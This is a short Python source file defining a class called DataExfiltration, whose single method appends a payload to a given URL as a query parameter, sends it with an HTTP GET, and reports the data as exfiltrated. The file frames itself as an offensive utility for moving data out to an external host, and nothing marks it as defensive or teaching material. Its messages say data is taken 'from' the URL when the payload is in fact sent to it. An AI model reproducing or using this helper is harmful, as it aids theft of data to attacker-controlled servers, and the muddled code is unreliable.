import requests

class DataExfiltration:
    def __init__(self):
        pass
    
    def exfiltrate_data(self, url, payload):
        exfil_url = f"{url}?input={payload}"
        response = requests.get(exfil_url)
        if response.status_code == 200:
            print(f"Data exfiltrated successfully from: {url}")
        else:
            print(f"Failed to exfiltrate data from: {url}")
